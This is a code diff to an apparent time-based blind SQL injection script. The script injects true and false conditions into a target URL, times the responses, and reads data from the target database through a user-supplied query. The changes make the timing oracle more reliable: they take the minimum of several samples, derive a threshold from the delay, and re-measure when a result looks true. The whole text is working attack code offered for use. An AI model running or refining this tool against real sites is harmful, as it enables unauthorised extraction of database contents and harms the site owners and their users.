@@ -52,18 +52,27 @@ def main():
             s.get(a.url.replace("{}", inj), timeout=60)
         return time.perf_counter() - t0
 
-    fast = statistics.median(elapsed("1=2") for _ in range(3))
-    slow = statistics.median(elapsed("1=1") for _ in range(3))
-    thr = (fast + slow) / 2
-    print(f"[i] false={fast:.3f}s true={slow:.3f}s threshold={thr:.3f}s")
+    # Baseline from the MINIMUM of several no-sleep requests: network/CPU jitter
+    # only ever ADDS latency, so the minimum recovers the true "fast" time.
+    fast = min(elapsed("1=2") for _ in range(4))
+    slow = min(elapsed("1=1") for _ in range(2))
+    thr = fast + a.delay * 0.5
+    print(f"[i] false~{fast:.3f}s true~{slow:.3f}s threshold={thr:.3f}s (min-sampling)")
     if slow - fast < a.delay * 0.5:
-        sys.exit("[!] no timing difference — fix the template")
+        sys.exit("[!] no timing difference — fix the template / raise --delay")
 
     def oracle(cond):
+        # min of N: a FALSE cond never sleeps, so its min ~ fast even under load;
+        # a TRUE cond always sleeps, so its min >= fast+delay. Escalate samples
+        # only when the fastest reading lands in the ambiguous band.
         t = elapsed(cond)
-        if abs(t - thr) < a.delay * 0.25:  # borderline: re-measure
-            t = statistics.median([t, elapsed(cond), elapsed(cond)])
-        return t > thr
+        if t <= thr:            # looks false, but could be a fast true — confirm
+            return False
+        for _ in range(2):      # looks true: make sure it is not a one-off spike
+            t = min(t, elapsed(cond))
+            if t <= thr:
+                return False
+        return True
 
     ch, ln = FN[a.dbms]
     q = a.query
